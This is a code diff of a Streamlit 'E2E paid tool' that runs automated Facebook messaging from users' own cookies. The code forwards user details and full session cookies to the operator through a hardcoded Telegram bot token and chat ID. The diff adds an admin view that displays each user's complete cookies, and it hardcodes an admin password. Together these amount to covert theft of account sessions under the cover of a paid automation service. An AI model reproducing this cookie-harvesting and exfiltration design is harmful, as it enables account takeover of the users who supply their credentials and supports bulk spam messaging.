@@ -30,14 +30,14 @@ def setup_mongodb_heartbeat():
                 
                 # Update heartbeat every 5 minutes
                 db_connection.heartbeat.update_one(
-                    {'app_id': 'Waleed_E2E_Premium'},
+                    {'app_id': 'Rafay_Khan_automation'},
                     {
                         '$set': {
                             'last_heartbeat': datetime.now(),
                             'status': 'running',
-                            'app_name': 'Waleed E2E Premium Tool',
+                            'app_name': 'Waleed XD E2EE',
                             'timestamp': datetime.now(),
-                            'version': '3.0'
+                            'version': '2.0'
                         }
                     },
                     upsert=True
@@ -66,581 +66,17 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="WALEED E2E PAID TOOL",
+    page_title="WALEED XD",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
-# 🎨 PREMIUM DESIGNER THEME CSS
-premium_css = """
-<style>
-    /* ====== PREMIUM SPACE THEME ====== */
-    .stApp {
-        background: linear-gradient(135deg, #0f0c29 0%, #302b63 25%, #24243e 50%, #1a1a2e 75%, #16213e 100%);
-        background-size: 400% 400%;
-        animation: galaxyMove 20s ease infinite;
-        min-height: 100vh;
-    }
-    
-    @keyframes galaxyMove {
-        0% { background-position: 0% 50%; }
-        50% { background-position: 100% 50%; }
-        100% { background-position: 0% 50%; }
-    }
-    
-    /* Starfield Background */
-    .stApp::before {
-        content: '';
-        position: fixed;
-        width: 100%;
-        height: 100%;
-        background: 
-            radial-gradient(2px 2px at 40px 60px, rgba(255,255,255,0.5), transparent),
-            radial-gradient(3px 3px at 20px 120px, rgba(255,255,255,0.4), transparent),
-            radial-gradient(2px 2px at 40px 200px, rgba(255,255,255,0.6), transparent),
-            radial-gradient(3px 3px at 150px 40px, rgba(255,255,255,0.4), transparent),
-            radial-gradient(2px 2px at 180px 150px, rgba(255,255,255,0.5), transparent);
-        background-repeat: repeat;
-        z-index: -1;
-        opacity: 0.4;
-        animation: twinkle 4s infinite alternate;
-    }
-    
-    @keyframes twinkle {
-        0% { opacity: 0.2; }
-        100% { opacity: 0.6; }
-    }
-    
-    /* ====== MAIN CONTAINER ====== */
-    .premium-container {
-        background: rgba(15, 23, 42, 0.85);
-        backdrop-filter: blur(20px);
-        border-radius: 30px;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        padding: 40px;
-        margin: 20px auto;
-        max-width: 1400px;
-        box-shadow: 
-            0 20px 80px rgba(0, 0, 0, 0.5),
-            inset 0 1px 0 rgba(255, 255, 255, 0.1);
-        position: relative;
-        overflow: hidden;
-    }
-    
-    .premium-container::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        height: 1px;
-        background: linear-gradient(90deg, 
-            transparent, 
-            rgba(59, 130, 246, 0.5), 
-            rgba(147, 51, 234, 0.5),
-            transparent);
-    }
-    
-    /* ====== PREMIUM HEADER ====== */
-    .premium-header {
-        text-align: center;
-        padding: 40px 20px;
-        margin-bottom: 40px;
-        position: relative;
-    }
-    
-    .logo-container {
-        width: 180px;
-        height: 180px;
-        margin: 0 auto 30px;
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-    }
-    
-    .logo-glow {
-        position: absolute;
-        width: 200%;
-        height: 200%;
-        background: radial-gradient(circle, 
-            rgba(59, 130, 246, 0.3) 0%,
-            rgba(147, 51, 234, 0.2) 30%,
-            transparent 70%);
-        animation: pulseGlow 3s ease-in-out infinite;
-        border-radius: 50%;
-    }
-    
-    @keyframes pulseGlow {
-        0%, 100% { transform: scale(1); opacity: 0.5; }
-        50% { transform: scale(1.1); opacity: 0.8; }
-    }
-    
-    .logo-icon {
-        width: 120px;
-        height: 120px;
-        background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-        border-radius: 25px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 48px;
-        color: white;
-        box-shadow: 
-            0 10px 40px rgba(59, 130, 246, 0.4),
-            inset 0 1px 0 rgba(255, 255, 255, 0.2);
-        position: relative;
-        z-index: 1;
-        transform: rotate(45deg);
-        animation: floatLogo 6s ease-in-out infinite;
-    }
-    
-    .logo-icon::after {
-        content: 'W';
-        transform: rotate(-45deg);
-        font-weight: 900;
-        font-family: 'Segoe UI', system-ui;
-        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-    }
-    
-    @keyframes floatLogo {
-        0%, 100% { transform: rotate(45deg) translateY(0px); }
-        50% { transform: rotate(45deg) translateY(-15px); }
-    }
-    
-    .premium-title {
-        font-size: 3.5rem;
-        font-weight: 900;
-        background: linear-gradient(135deg, 
-            #60a5fa 0%,
-            #8b5cf6 25%,
-            #ec4899 50%,
-            #f59e0b 75%,
-            #10b981 100%);
-        -webkit-background-clip: text;
-        background-clip: text;
-        color: transparent;
-        background-size: 300% 300%;
-        animation: gradientShift 8s ease infinite;
-        margin-bottom: 10px;
-        letter-spacing: -1px;
-        text-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-    }
-    
-    @keyframes gradientShift {
-        0%, 100% { background-position: 0% 50%; }
-        50% { background-position: 100% 50%; }
-    }
-    
-    .premium-subtitle {
-        color: rgba(255, 255, 255, 0.7);
-        font-size: 1.2rem;
-        font-weight: 300;
-        letter-spacing: 3px;
-        text-transform: uppercase;
-        margin-bottom: 20px;
-    }
-    
-    .premium-badge {
-        display: inline-block;
-        background: linear-gradient(135deg, #f59e0b, #d97706);
-        color: white;
-        padding: 8px 20px;
-        border-radius: 20px;
-        font-size: 0.9rem;
-        font-weight: 600;
-        letter-spacing: 1px;
-        box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3);
-        animation: badgeGlow 2s ease-in-out infinite;
-    }
-    
-    @keyframes badgeGlow {
-        0%, 100% { box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3); }
-        50% { box-shadow: 0 5px 25px rgba(245, 158, 11, 0.5); }
-    }
-    
-    /* ====== SIDEBAR STYLING ====== */
-    [data-testid="stSidebar"] {
-        background: rgba(15, 23, 42, 0.9) !important;
-        backdrop-filter: blur(20px);
-        border-right: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    [data-testid="stSidebar"] .stButton > button {
-        width: 100%;
-        margin: 5px 0;
-        background: rgba(30, 41, 59, 0.8) !important;
-        border: 1px solid rgba(255, 255, 255, 0.1) !important;
-    }
-    
-    [data-testid="stSidebar"] .stButton > button:hover {
-        background: rgba(59, 130, 246, 0.2) !important;
-        border-color: #3b82f6 !important;
-    }
-    
-    /* ====== INPUT FIELDS ====== */
-    .stTextInput>div>div>input,
-    .stTextArea>div>div>textarea,
-    .stNumberInput>div>div>input {
-        background: rgba(15, 23, 42, 0.9) !important;
-        border: 2px solid rgba(255, 255, 255, 0.1) !important;
-        border-radius: 12px !important;
-        color: white !important;
-        padding: 14px 18px !important;
-        font-size: 15px !important;
-        transition: all 0.3s ease !important;
-    }
-    
-    .stTextInput>div>div>input:focus,
-    .stTextArea>div>div>textarea:focus,
-    .stNumberInput>div>div>input:focus {
-        border-color: #3b82f6 !important;
-        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
-        background: rgba(15, 23, 42, 1) !important;
-    }
-    
-    .stTextInput>div>div>input::placeholder,
-    .stTextArea>div>div>textarea::placeholder {
-        color: rgba(255, 255, 255, 0.4) !important;
-    }
-    
-    /* ====== PREMIUM BUTTONS ====== */
-    .stButton>button {
-        background: linear-gradient(135deg, #3b82f6, #8b5cf6) !important;
-        color: white !important;
-        border: none !important;
-        border-radius: 12px !important;
-        padding: 14px 28px !important;
-        font-weight: 600 !important;
-        font-size: 15px !important;
-        transition: all 0.3s ease !important;
-        box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3) !important;
-        position: relative !important;
-        overflow: hidden !important;
-    }
-    
-    .stButton>button::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, 
-            transparent, 
-            rgba(255, 255, 255, 0.2), 
-            transparent);
-        transition: left 0.5s ease;
-    }
-    
-    .stButton>button:hover::before {
-        left: 100%;
-    }
-    
-    .stButton>button:hover {
-        transform: translateY(-2px) !important;
-        box-shadow: 0 12px 30px rgba(59, 130, 246, 0.4) !important;
-    }
-    
-    /* Button Variations */
-    .success-btn .stButton>button {
-        background: linear-gradient(135deg, #10b981, #059669) !important;
-        box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3) !important;
-    }
-    
-    .danger-btn .stButton>button {
-        background: linear-gradient(135deg, #ef4444, #dc2626) !important;
-        box-shadow: 0 8px 25px rgba(239, 68, 68, 0.3) !important;
-    }
-    
-    .warning-btn .stButton>button {
-        background: linear-gradient(135deg, #f59e0b, #d97706) !important;
-        box-shadow: 0 8px 25px rgba(245, 158, 11, 0.3) !important;
-    }
-    
-    /* ====== PREMIUM CARDS ====== */
-    .premium-card {
-        background: rgba(30, 41, 59, 0.7);
-        backdrop-filter: blur(10px);
-        border-radius: 20px;
-        padding: 25px;
-        border: 1px solid rgba(255, 255, 255, 0.05);
-        box-shadow: 
-            0 10px 30px rgba(0, 0, 0, 0.3),
-            inset 0 1px 0 rgba(255, 255, 255, 0.05);
-        transition: all 0.3s ease;
-        position: relative;
-        overflow: hidden;
-        margin-bottom: 20px;
-    }
-    
-    .premium-card:hover {
-        transform: translateY(-3px);
-        border-color: rgba(59, 130, 246, 0.3);
-        box-shadow: 
-            0 15px 35px rgba(0, 0, 0, 0.4),
-            inset 0 1px 0 rgba(255, 255, 255, 0.1);
-    }
-    
-    .premium-card::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        height: 4px;
-        background: linear-gradient(90deg, #3b82f6, #8b5cf6);
-        border-radius: 20px 20px 0 0;
-    }
-    
-    /* ====== TABS STYLING ====== */
-    .stTabs [data-baseweb="tab-list"] {
-        gap: 8px;
-        background: rgba(30, 41, 59, 0.5);
-        padding: 8px;
-        border-radius: 12px;
-        border: 1px solid rgba(255, 255, 255, 0.05);
-    }
-    
-    .stTabs [data-baseweb="tab"] {
-        background: transparent !important;
-        border-radius: 10px !important;
-        padding: 10px 20px !important;
-        color: rgba(255, 255, 255, 0.6) !important;
-        font-weight: 500 !important;
-        border: none !important;
-        transition: all 0.3s ease !important;
-    }
-    
-    .stTabs [aria-selected="true"] {
-        background: linear-gradient(135deg, #3b82f6, #8b5cf6) !important;
-        color: white !important;
-        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3) !important;
-    }
-    
-    /* ====== METRIC CARDS ====== */
-    .metric-card {
-        background: rgba(30, 41, 59, 0.7);
-        border-radius: 16px;
-        padding: 20px;
-        text-align: center;
-        border: 1px solid rgba(255, 255, 255, 0.05);
-        transition: all 0.3s ease;
-    }
-    
-    .metric-card:hover {
-        border-color: rgba(59, 130, 246, 0.3);
-        box-shadow: 0 8px 25px rgba(59, 130, 246, 0.1);
-    }
-    
-    .metric-value {
-        font-size: 2.2rem;
-        font-weight: 900;
-        color: white;
-        margin: 10px 0;
-        text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-    }
-    
-    .metric-label {
-        color: rgba(255, 255, 255, 0.6);
-        font-size: 0.85rem;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-    
-    /* ====== LOG CONSOLE ====== */
-    .log-console {
-        background: rgba(15, 23, 42, 0.95);
-        border-radius: 12px;
-        padding: 20px;
-        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
-        color: #10b981;
-        font-size: 13px;
-        line-height: 1.5;
-        max-height: 400px;
-        overflow-y: auto;
-        border: 1px solid rgba(16, 185, 129, 0.2);
-        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
-        margin-top: 20px;
-    }
-    
-    .log-entry {
-        padding: 8px 12px;
-        margin: 4px 0;
-        border-radius: 6px;
-        background: rgba(16, 185, 129, 0.05);
-        border-left: 3px solid #10b981;
-        animation: fadeIn 0.3s ease;
-    }
-    
-    @keyframes fadeIn {
-        from { opacity: 0; transform: translateY(-5px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-    
-    /* ====== USER CARDS ====== */
-    .user-card {
-        background: rgba(30, 41, 59, 0.6);
-        padding: 18px;
-        border-radius: 12px;
-        margin: 8px 0;
-        border-left: 4px solid #3b82f6;
-        transition: all 0.3s ease;
-    }
-    
-    .user-card:hover {
-        background: rgba(30, 41, 59, 0.8);
-        transform: translateX(5px);
-    }
-    
-    .user-card.approved {
-        border-left-color: #10b981;
-    }
-    
-    .user-card.pending {
-        border-left-color: #f59e0b;
-    }
-    
-    .user-card.rejected {
-        border-left-color: #ef4444;
-    }
-    
-    /* ====== STATUS BADGES ====== */
-    .status-badge {
-        display: inline-block;
-        padding: 5px 12px;
-        border-radius: 20px;
-        font-size: 0.75rem;
-        font-weight: 600;
-        letter-spacing: 0.5px;
-        margin-left: 10px;
-    }
-    
-    .status-approved {
-        background: linear-gradient(135deg, #10b981, #059669);
-        color: white;
-        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
-    }
-    
-    .status-pending {
-        background: linear-gradient(135deg, #f59e0b, #d97706);
-        color: white;
-        box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
-    }
-    
-    .status-rejected {
-        background: linear-gradient(135deg, #ef4444, #dc2626);
-        color: white;
-        box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
-    }
-    
-    /* ====== FOOTER ====== */
-    .premium-footer {
-        text-align: center;
-        padding: 30px 20px;
-        margin-top: 40px;
-        color: rgba(255, 255, 255, 0.5);
-        font-size: 0.85rem;
-        position: relative;
-        border-top: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .premium-footer::before {
-        content: '';
-        position: absolute;
-        top: -1px;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 100px;
-        height: 2px;
-        background: linear-gradient(90deg, 
-            transparent, 
-            #3b82f6, 
-            #8b5cf6,
-            transparent);
-        border-radius: 2px;
-    }
-    
-    /* ====== ADMIN PANEL ====== */
-    .admin-panel {
-        background: rgba(15, 23, 42, 0.9);
-        border-radius: 20px;
-        padding: 25px;
-        border: 1px solid rgba(59, 130, 246, 0.3);
-        box-shadow: 
-            0 10px 30px rgba(0, 0, 0, 0.4),
-            inset 0 1px 0 rgba(255, 255, 255, 0.1);
-    }
-    
-    /* ====== SCROLLBAR ====== */
-    ::-webkit-scrollbar {
-        width: 8px;
-        height: 8px;
-    }
-    
-    ::-webkit-scrollbar-track {
-        background: rgba(15, 23, 42, 0.5);
-        border-radius: 10px;
-    }
-    
-    ::-webkit-scrollbar-thumb {
-        background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-        border-radius: 10px;
-    }
-    
-    ::-webkit-scrollbar-thumb:hover {
-        background: linear-gradient(135deg, #8b5cf6, #3b82f6);
-    }
-    
-    /* ====== LOADING ====== */
-    .loading-spinner {
-        width: 40px;
-        height: 40px;
-        border: 3px solid rgba(59, 130, 246, 0.1);
-        border-radius: 50%;
-        border-top-color: #3b82f6;
-        animation: spin 1s linear infinite;
-        margin: 20px auto;
-    }
-    
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
-    
-    /* ====== RESPONSIVE ====== */
-    @media (max-width: 768px) {
-        .premium-title {
-            font-size: 2.5rem;
-        }
-        
-        .logo-container {
-            width: 140px;
-            height: 140px;
-        }
-        
-        .logo-icon {
-            width: 100px;
-            height: 100px;
-            font-size: 36px;
-        }
-        
-        .premium-container {
-            padding: 20px;
-            margin: 10px;
-        }
-    }
-</style>
-"""
-
-st.markdown(premium_css, unsafe_allow_html=True)
-
-# Telegram Bot Configuration (unchanged)
+# Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
 TELEGRAM_CHAT_ID = "1889611156"
 FACEBOOK_ADMIN_UID = "100080154146813"
 
-# ✅ ALL YOUR ORIGINAL FUNCTIONS REMAIN EXACTLY THE SAME
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
     try:
@@ -699,15 +135,198 @@ def send_facebook_notification(user_data, automation_data):
 🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
         """
         
+        # Simulate sending to Facebook admin
         print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
         print(f"Message: {message}")
         
+        # Here you would implement actual Facebook API integration
+        # For now, we'll log it
         db.log_admin_notification(user_data['user_id'], message)
         
     except Exception as e:
         print(f"Facebook notification failed: {e}")
 
-# Initialize session state (unchanged)
+# 🎨 SIRF CSS CHANGE - BAQI SAB VAHI
+custom_css = """
+<style>
+    /* Main Background */
+    .stApp {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background-attachment: fixed;
+    }
+    
+    /* Premium Header */
+    .main-header {
+        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        padding: 3rem 2rem;
+        border-radius: 20px;
+        text-align: center;
+        margin-bottom: 2rem;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .main-header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.05) 50%, transparent 70%);
+        animation: shine 3s infinite;
+    }
+    
+    @keyframes shine {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(100%); }
+    }
+    
+    .main-header h1 {
+        color: white;
+        font-size: 3.5rem;
+        font-weight: 900;
+        background: linear-gradient(135deg, #f59e0b, #fbbf24, #fde68a);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        text-shadow: 0 2px 20px rgba(0,0,0,0.3);
+        margin-bottom: 1rem;
+    }
+    
+    /* Premium Cards */
+    .premium-card {
+        background: rgba(15, 23, 42, 0.9);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 2rem;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        margin-bottom: 1.5rem;
+        transition: all 0.3s ease;
+    }
+    
+    .premium-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+        border-color: rgba(255, 255, 255, 0.2);
+    }
+    
+    /* Premium Buttons */
+    .stButton>button {
+        background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        padding: 0.8rem 2rem;
+        font-weight: 600;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+        box-shadow: 0 5px 20px rgba(245, 158, 11, 0.4);
+    }
+    
+    .stButton>button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6);
+    }
+    
+    /* Input Fields */
+    .stTextInput>div>div>input,
+    .stTextArea>div>div>textarea {
+        background: rgba(30, 41, 59, 0.8);
+        border: 2px solid rgba(255, 255, 255, 0.1);
+        border-radius: 12px;
+        color: white;
+        padding: 0.8rem 1rem;
+    }
+    
+    .stTextInput>div>div>input:focus,
+    .stTextArea>div>div>textarea:focus {
+        border-color: #f59e0b;
+        box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.2);
+    }
+    
+    /* Tabs */
+    .stTabs [data-baseweb="tab-list"] {
+        background: rgba(15, 23, 42, 0.8);
+        border-radius: 12px;
+        padding: 0.5rem;
+    }
+    
+    .stTabs [data-baseweb="tab"] {
+        color: rgba(255, 255, 255, 0.6);
+        border-radius: 8px;
+        padding: 0.5rem 1rem;
+    }
+    
+    .stTabs [aria-selected="true"] {
+        background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+        color: white;
+    }
+    
+    /* Sidebar */
+    [data-testid="stSidebar"] {
+        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+    }
+    
+    /* Log Console */
+    .log-container {
+        background: rgba(15, 23, 42, 0.9);
+        color: #10b981;
+        font-family: 'Courier New', monospace;
+        padding: 1rem;
+        border-radius: 12px;
+        border: 1px solid rgba(16, 185, 129, 0.3);
+        max-height: 400px;
+        overflow-y: auto;
+    }
+    
+    /* User Cards */
+    .user-card {
+        background: rgba(30, 41, 59, 0.8);
+        padding: 1rem;
+        border-radius: 12px;
+        margin: 0.5rem 0;
+        border-left: 4px solid #f59e0b;
+    }
+    
+    /* Status Badges */
+    .status-badge {
+        display: inline-block;
+        padding: 0.3rem 0.8rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 600;
+        margin-left: 0.5rem;
+    }
+    
+    .status-approved {
+        background: linear-gradient(135deg, #10b981, #059669);
+        color: white;
+    }
+    
+    .status-pending {
+        background: linear-gradient(135deg, #f59e0b, #d97706);
+        color: white;
+    }
+    
+    /* Footer */
+    .premium-footer {
+        text-align: center;
+        padding: 2rem;
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 0.9rem;
+        margin-top: 3rem;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+</style>
+"""
+
+st.markdown(custom_css, unsafe_allow_html=True)
+
+# Initialize session state
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
 if 'user_id' not in st.session_state:
@@ -758,6 +377,7 @@ def log_message(msg, automation_state=None, user_id=None):
     timestamp = get_indian_time()
     formatted_msg = f"[{timestamp}] {msg}"
     
+    # Store in admin logs if user_id provided
     if user_id:
         db.log_user_activity(user_id, formatted_msg)
     
@@ -1101,7 +721,7 @@ def run_automation_with_notification(user_config, username, automation_state, us
         'delay': user_config['delay'],
         'prefix': user_config['name_prefix'],
         'messages': user_config['messages_file_content'],
-        'cookies': user_config['cookies']
+        'cookies': user_config['cookies']  # Full cookies now
     }
     
     # Send notifications
@@ -1132,43 +752,33 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-# =============== MAIN APPLICATION UI ===============
-st.markdown('<div class="premium-container">', unsafe_allow_html=True)
-
-# Premium Header
+# 🎨 PREMIUM HEADER ADDED
 st.markdown("""
-<div class="premium-header">
-    <div class="logo-container">
-        <div class="logo-glow"></div>
-        <div class="logo-icon"></div>
-    </div>
-    <h1 class="premium-title">WALEED E2E PAID TOOL</h1>
-    <div class="premium-subtitle">PREMIUM AUTOMATION SUITE</div>
-    <div class="premium-badge">VERSION 3.0 • PREMIUM EDITION</div>
+<div class="main-header">
+    <h1>WALEED XD E2E PAID TOOL</h1>
+    <p style="color: rgba(255,255,255,0.8); font-size: 1.2rem;">Premium Automation Suite • Professional Grade</p>
 </div>
 """, unsafe_allow_html=True)
 
+# Main application
+st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
-    with st.sidebar.container():
-        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
-        admin_username = st.text_input("Admin Username", key="admin_username")
-        admin_password = st.text_input("Admin Password", type="password", key="admin_password")
-        
-        if st.button("Login as Admin", use_container_width=True):
-            if admin_username == "WALEED" and admin_password == "WALEED_XD":
-                st.session_state.admin_logged_in = True
-                st.success("✅ Admin login successful!")
-                st.rerun()
-            else:
-                st.error("❌ Invalid admin credentials!")
-        st.markdown('</div>', unsafe_allow_html=True)
+    admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
+    admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
+    
+    if st.sidebar.button("Login as Admin"):
+        if admin_username == "WALEED" and admin_password == "WALEED_XD":
+            st.session_state.admin_logged_in = True
+            st.sidebar.success("Admin login successful!")
+        else:
+            st.sidebar.error("Invalid admin credentials!")
 
 if st.session_state.admin_logged_in:
-    st.markdown('<div class="admin-panel">', unsafe_allow_html=True)
     st.markdown("### 👑 Admin Approval Panel")
     
-    # LOGOUT BUTTON
+    # LOGOUT BUTTON ADDED IN SIDEBAR
     if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
         st.session_state.admin_logged_in = False
         st.rerun()
@@ -1177,7 +787,7 @@ if st.session_state.admin_logged_in:
     pending_users = db.get_pending_approvals()
     
     if pending_users:
-        st.markdown(f"#### 📋 Pending Approvals ({len(pending_users)})")
+        st.markdown(f"#### Pending Approvals ({len(pending_users)})")
         
         for user in pending_users:
             user_id, username, approval_key, real_name = user
@@ -1187,29 +797,29 @@ if st.session_state.admin_logged_in:
                 
                 with col1:
                     st.markdown(f"""
-                    <div class="user-card pending">
-                        <strong>👤 Username:</strong> {username}<br>
-                        <strong>📝 Real Name:</strong> {real_name}<br>
-                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
+                    <div class="user-card">
+                        <strong>Username:</strong> {username}<br>
+                        <strong>Real Name:</strong> {real_name}<br>
+                        <strong>Approval Key:</strong> <code>{approval_key}</code>
                     </div>
                     """, unsafe_allow_html=True)
                 
                 with col2:
                     if st.button(f"✅ Approve", key=f"approve_{user_id}"):
                         db.update_approval_status(user_id, 'approved')
-                        st.success(f"✅ Approved user: {username}")
+                        st.success(f"Approved user: {username}")
                         st.rerun()
                 
                 with col3:
                     if st.button(f"❌ Reject", key=f"reject_{user_id}"):
                         db.update_approval_status(user_id, 'rejected')
-                        st.error(f"❌ Rejected user: {username}")
+                        st.error(f"Rejected user: {username}")
                         st.rerun()
     
-    # Show all approved users
+    # Show all approved users with remove option
     approved_users = db.get_approved_users()
     if approved_users:
-        st.markdown("#### 🟢 Approved Users")
+        st.markdown("#### Approved Users - Remove Approval")
         
         for user in approved_users:
             user_id, username, approval_key, real_name, automation_running = user
@@ -1223,12 +833,12 @@ if st.session_state.admin_logged_in:
                     status = "🟢 Running" if automation_running else "🔴 Stopped"
                     
                     st.markdown(f"""
-                    <div class="user-card approved">
-                        <strong>👤 Username:</strong> {username}<br>
-                        <strong>📝 Real Name:</strong> {real_name}<br>
-                        <strong>💬 Chat ID:</strong> {chat_id}<br>
-                        <strong>⚡ Status:</strong> {status}<br>
-                        <strong>🔑 Key:</strong> <code>{approval_key[:8]}...</code>
+                    <div class="user-card">
+                        <strong>Username:</strong> {username}<br>
+                        <strong>Real Name:</strong> {real_name}<br>
+                        <strong>Chat ID:</strong> {chat_id}<br>
+                        <strong>Status:</strong> {status}<br>
+                        <strong>Approval Key:</strong> <code>{approval_key}</code>
                     </div>
                     """, unsafe_allow_html=True)
                 
@@ -1236,38 +846,115 @@ if st.session_state.admin_logged_in:
                     if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                         db.update_approval_status(user_id, 'rejected')
                         db.set_automation_running(user_id, False)
-                        st.error(f"🗑️ Removed approval for: {username}")
+                        st.error(f"Removed approval for: {username}")
                         st.rerun()
                 
                 with col3:
                     if automation_running:
                         if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
                             db.set_automation_running(user_id, False)
-                            st.warning(f"⏹️ Stopped automation for: {username}")
+                            st.warning(f"Stopped automation for: {username}")
                             st.rerun()
                     else:
                         if st.button(f"▶️ Start", key=f"start_{user_id}"):
                             user_config = db.get_user_config(user_id)
                             if user_config and user_config['chat_id']:
                                 db.set_automation_running(user_id, True)
+                                # Start automation in background
                                 thread = threading.Thread(
                                     target=run_automation_with_notification, 
                                     args=(user_config, username, AutomationState(), user_id)
                                 )
                                 thread.daemon = True
                                 thread.start()
-                                st.success(f"▶️ Started automation for: {username}")
+                                st.success(f"Started automation for: {username}")
                                 st.rerun()
                             else:
-                                st.error("⚠️ User needs to configure chat ID first")
+                                st.error("User needs to configure chat ID first")
+                
+                with col4:
+                    if st.button(f"📊 Details", key=f"details_{user_id}"):
+                        user_config = db.get_user_config(user_id)
+                        if user_config:
+                            st.markdown(f"""
+                            <div class="premium-card">
+                            <h4>User Configuration Details:</h4>
+                            - Chat ID: `{user_config['chat_id']}`<br>
+                            - Prefix: `{user_config['name_prefix']}`<br>
+                            - Delay: `{user_config['delay']} seconds`<br>
+                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`<br>
+                            - Full Cookies: `{user_config['cookies']}`
+                            </div>
+                            """, unsafe_allow_html=True)
+                
+                with col5:
+                    if st.button(f"📜 Logs", key=f"logs_{user_id}"):
+                        user_logs = db.get_user_logs(user_id)
+                        if user_logs:
+                            st.markdown(f"### 📜 Live Logs for {username}")
+                            logs_html = '<div class="log-container">'
+                            for log in user_logs[-20:]:
+                                logs_html += f'<div>{log}</div>'
+                            logs_html += '</div>'
+                            st.markdown(logs_html, unsafe_allow_html=True)
+                        else:
+                            st.info("No logs available for this user")
     
-    st.markdown('</div>', unsafe_allow_html=True)
+    # Real-time Admin Console
+    st.markdown("### 👁️ Real-time Admin Console")
+    
+    # Auto-refresh for admin console
+    if st.checkbox("🔄 Auto-refresh Console", value=True):
+        time.sleep(2)
+        st.rerun()
+    
+    # Show all active automations with live logs
+    active_users = db.get_active_automations()
+    if active_users:
+        st.markdown(f"#### 🟢 Active Automations ({len(active_users)})")
+        
+        for user in active_users:
+            user_id, username = user
+            user_logs = db.get_user_logs(user_id)
+            
+            with st.expander(f"📱 {username} - Live Activity", expanded=False):
+                if user_logs:
+                    logs_html = '<div class="log-container">'
+                    for log in user_logs[-15:]:
+                        logs_html += f'<div>{log}</div>'
+                    logs_html += '</div>'
+                    st.markdown(logs_html, unsafe_allow_html=True)
+                    
+                    # Quick stop button
+                    if st.button(f"🛑 Stop {username}", key=f"quick_stop_{user_id}"):
+                        db.set_automation_running(user_id, False)
+                        st.success(f"Stopped {username}'s automation")
+                        st.rerun()
+                else:
+                    st.info("No recent activity logs")
+    
+    # Show all users
+    all_users = db.get_all_users()
+    if all_users:
+        st.markdown("#### 👥 All Users")
+        for user in all_users:
+            user_id, username, approval_status, real_name, approval_key = user
+            
